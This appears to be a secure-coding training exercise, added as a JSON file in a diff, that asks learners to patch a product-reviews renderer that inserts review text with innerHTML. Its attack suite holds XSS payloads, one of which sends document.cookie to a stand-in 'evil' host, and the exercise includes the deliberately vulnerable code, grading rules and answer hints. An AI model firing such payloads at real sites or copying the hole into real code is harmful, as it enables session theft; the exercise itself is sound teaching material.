@@ -1,0 +1,50 @@
+{
+  "id": "sec-201",
+  "title": "A product review is running code on the reviews page",
+  "skill": "xss",
+  "subSkill": "xss.output-encoding",
+  "tier": "beginner",
+  "format": "patch",
+  "validator": "ast-diff",
+  "repo": "aurora-store",
+  "file": "public/reviews.js",
+  "reportedBy": "Priya (Support)",
+
+  "masteryRequired": 0.0,
+  "isDrill": false,
+  "isBoss": false,
+  "requires": null,
+
+  "brief": "Someone left a review on the kettle listing and now every visitor to that page gets a popup. The review text is being dropped straight into the page as markup.",
+
+  "vulnerable": "function renderReview(review) {\n  const card = document.createElement('div');\n  card.className = 'review';\n\n  const body = document.createElement('p');\n  body.innerHTML = review.body;\n\n  card.append(body);\n  document.querySelector('#reviews').append(card);\n}",
+
+  "meta": {
+    "inputNames": ["body", "review"]
+  },
+
+  "rules": [
+    "xss.no-html-sink",
+    "xss.uses-safe-sink",
+    "output.reaches-the-page",
+    "output.no-markup-stripping"
+  ],
+
+  "attackSuite": [
+    { "payload": "<img src=x onerror=\"fetch('//evil/'+document.cookie)\">", "label": "No script tag needed" },
+    { "payload": "<svg onload=alert(1)>", "label": "A different tag, same result" }
+  ],
+
+  "functionalSuite": [
+    { "value": "Boils fast, great value & quiet", "label": "A review containing an ampersand" },
+    { "value": "Bargain at <£20", "label": "A review containing an angle bracket" }
+  ],
+
+  "hints": [
+    "The attack did not need a <script> tag. Filtering for one would miss both payloads above.",
+    "The problem is that the browser is being asked to parse this text as markup at all. What if it were never parsed?",
+    "Set body.textContent instead of body.innerHTML. Text is displayed, never executed."
+  ],
+
+  "xp": { "firstAttempt": 80, "withHints": 40, "retry": 25 }
+}
